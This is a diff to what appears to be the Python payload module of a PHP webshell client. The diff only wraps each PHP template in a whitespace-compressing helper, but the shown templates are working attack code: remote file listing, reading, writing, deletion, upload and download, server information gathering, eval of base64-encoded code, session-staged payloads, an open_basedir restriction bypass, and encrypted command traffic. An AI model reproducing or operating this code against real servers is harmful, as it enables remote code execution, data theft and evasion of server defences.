@@ -46,7 +46,13 @@ function decoder_echo_raw($s) {echo base64_encode($s);}
 # session id was specified to avoid session
 # forget to save session id in cookie
 
-SUBMIT_WRAPPER_PHP = """\
+
+def compress_phpcode_template(s):
+    return re.sub(r"\n +", " ", s, re.M)
+
+
+SUBMIT_WRAPPER_PHP = compress_phpcode_template(
+    """\
 if (session_status() == PHP_SESSION_NONE) {{
     session_id('{session_id}');
     session_start();
@@ -63,8 +69,10 @@ function decoder_echo($s) {{
 echo '{delimiter_start_1}'.'{delimiter_start_2}';
 try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
+)
 
-LIST_DIR_PHP = """
+LIST_DIR_PHP = compress_phpcode_template(
+    """
 error_reporting(0);
 $folderPath = DIR_PATH;
 $files = scandir($folderPath);
@@ -90,8 +98,10 @@ foreach ($files as $file) {
 }
 decoder_echo(json_encode($result));
 """
+)
 
-GET_FILE_CONTENT_PHP = """
+GET_FILE_CONTENT_PHP = compress_phpcode_template(
+    """
 $filePath = FILE_PATH;
 if(!is_file($filePath)) {
     decoder_echo("WRONG_NOT_FILE");
@@ -106,8 +116,10 @@ else if(filesize($filePath) > MAX_SIZE) {
     decoder_echo(base64_encode($content));
 }
 """
+)
 
-PUT_FILE_CONTENT_PHP = """
+PUT_FILE_CONTENT_PHP = compress_phpcode_template(
+    """
 $filePath = FILE_PATH;
 $fileContent = base64_decode(FILE_CONTENT);
 if(!is_file($filePath) && is_writeable($filePath)) {
@@ -117,9 +129,11 @@ if(!is_file($filePath) && is_writeable($filePath)) {
     decoder_echo("SUCCESS");
 }
 """
+)
 
 
-DELETE_FILE_PHP = """
+DELETE_FILE_PHP = compress_phpcode_template(
+    """
 $filePath = FILE_PATH;
 if(!is_file($filePath)) {
     decoder_echo("WRONG_NOT_FILE");
@@ -134,8 +148,10 @@ if(!is_file($filePath)) {
     }
 }
 """
+)
 
-MOVE_FILE_PHP = """
+MOVE_FILE_PHP = compress_phpcode_template(
+    """
 $filePath = #FILEPATH#;
 $newFilePath = #NEW_FILEPATH#;
 if(!file_exists($filePath)) {
@@ -151,15 +167,19 @@ if(!file_exists($filePath)) {
     }
 }
 """
+)
 
-UPLOAD_FILE_CHUNK_PHP = """
+UPLOAD_FILE_CHUNK_PHP = compress_phpcode_template(
+    """
 $file = tempnam("", "");
 $content = base64_decode('BASE64_CONTENT');
 file_put_contents($file, $content);
 decoder_echo($file);
 """
+)
 
-UPLOAD_FILE_MERGE_PHP = """
+UPLOAD_FILE_MERGE_PHP = compress_phpcode_template(
+    """
 $files = json_decode(FILES);
 $content = "";
 $readerror = false;
@@ -185,8 +205,10 @@ else if($readerror) {
     decoder_echo("DONE");
 }
 """
+)
 
-DOWNLOAD_FILE_FILESIZE_PHP = """
+DOWNLOAD_FILE_FILESIZE_PHP = compress_phpcode_template(
+    """
 if(!is_file(FILEPATH)) {
     decoder_echo("WRONG_NOT_FILE");
 } else if(!is_readable(FILEPATH)) {
@@ -195,8 +217,10 @@ if(!is_file(FILEPATH)) {
     decoder_echo(json_encode(filesize(FILEPATH)));
 }
 """
+)
 
-DOWNLOAD_FILE_CHUNK_PHP = """
+DOWNLOAD_FILE_CHUNK_PHP = compress_phpcode_template(
+    """
 $file = fopen(FILEPATH, "rb");
 if(!is_file(FILEPATH)) {
     decoder_echo("WRONG_NOT_FILE");
@@ -211,8 +235,10 @@ if(!is_file(FILEPATH)) {
     decoder_echo(base64_encode($content));
 }
 """
+)
 
-GET_BASIC_INFO_PHP = """
+GET_BASIC_INFO_PHP = compress_phpcode_template(
+    """
 $infos = array();
 array_push($infos, [
     "key" => "PHPVERSION",
@@ -272,32 +298,39 @@ array_push($infos, [
 ]);
 decoder_echo(json_encode($infos));
 """
-
-DOWNLOAD_PHPINFO_PHP = """
+)
+DOWNLOAD_PHPINFO_PHP = compress_phpcode_template(
+    """
 ob_start();
 phpinfo();
 $content = ob_get_contents();
 ob_end_clean();
 decoder_echo(base64_encode($content));
 """
+)
 
-EVAL_PHP = """
+EVAL_PHP = compress_phpcode_template(
+    """
 ob_start();
 eval(base64_decode({code_b64}));
 $content = ob_get_contents();
 ob_end_clean();
 decoder_echo($content);
 """
+)
 
-PAYLOAD_SESSIONIZE = """
+PAYLOAD_SESSIONIZE = compress_phpcode_template(
+    """
 $b64_part = 'B64_PART';
 if(!$_SESSION['PAYLOAD_STORE']) {
     $_SESSION['PAYLOAD_STORE'] = array();
 }
 $_SESSION['PAYLOAD_STORE'][PAYLOAD_ORDER] = $b64_part;
 """
+)
 
-PAYLOAD_SESSIONIZE_TRIGGER = """
+PAYLOAD_SESSIONIZE_TRIGGER = compress_phpcode_template(
+    """
 if(!$_SESSION['PAYLOAD_STORE']) {
     decoder_echo("PAYLOAD_SESSIONIZE_UNEXIST");
 }else{
@@ -318,12 +351,16 @@ if(!$_SESSION['PAYLOAD_STORE']) {
 }
 unset($_SESSION['PAYLOAD_STORE']);
 """
+)
 
-ANTIREPLAY_GENKEY_PHP = """
+ANTIREPLAY_GENKEY_PHP = compress_phpcode_template(
+    """
 decoder_echo(($_SESSION['SESSION_NAME']=rand()%10000).'');
 """
+)
 
-ANTIREPLAY_VERIFY_PHP = """
+ANTIREPLAY_VERIFY_PHP = compress_phpcode_template(
+    """
 if(KEY == $_SESSION[SESSION_NAME]) {
     eval(base64_decode(PAYLOAD_B64));
     unset($_SESSION[SESSION_NAME]);
@@ -331,8 +368,10 @@ if(KEY == $_SESSION[SESSION_NAME]) {
     decoder_echo("WRONG_BAD_KEY");
 }
 """
+)
 
-BYPASS_OPEN_BASEDIR_PHP = """
+BYPASS_OPEN_BASEDIR_PHP = compress_phpcode_template(
+    """
 function bypass_open_basedir()
 {
     $basedir = @ini_get("open_basedir");
@@ -365,8 +404,10 @@ function bypass_open_basedir()
 bypass_open_basedir();
 PAYLOAD
 """
+)
 
-ENCRYPTION_SENDKEY_PHP = """
+ENCRYPTION_SENDKEY_PHP = compress_phpcode_template(
+    """
 if(extension_loaded('openssl')) {
     $_SESSION[SESSION_NAME] = openssl_random_pseudo_bytes(32);
     openssl_public_encrypt(
@@ -380,8 +421,10 @@ if(extension_loaded('openssl')) {
     decoder_echo("WRONG_NO_OPENSSL");
 }
 """
+)
 
-ENCRYPTION_COMMUNICATE_PHP = """
+ENCRYPTION_COMMUNICATE_PHP = compress_phpcode_template(
+    """
 function aes_enc($data) {
     $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
     $encryptedData = openssl_encrypt(
@@ -398,7 +441,7 @@ function aes_dec($encryptedData) {
     $data = base64_decode($encryptedData);
     return openssl_decrypt(
         base64_encode(substr($data, 16)),
-        'aes-256-cbc',
+        'AES-256-CBC',
         $_SESSION[SESSION_NAME],
         0,
         substr($data, 0, 16)
@@ -413,6 +456,7 @@ if(extension_loaded('openssl')) {
     decoder_echo("WRONG_NO_OPENSSL");
 }
 """
+)
 
 PAYLOAD_SESSIONIZE_CHUNK = 1024
 
@@ -442,10 +486,6 @@ def base64_encode(s):
     if isinstance(s, str):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
-
-
-def compress_phpcode_template(s):
-    return re.sub(r"\n +", " ", s, re.M)
 
 
 def to_sessionize_payload(
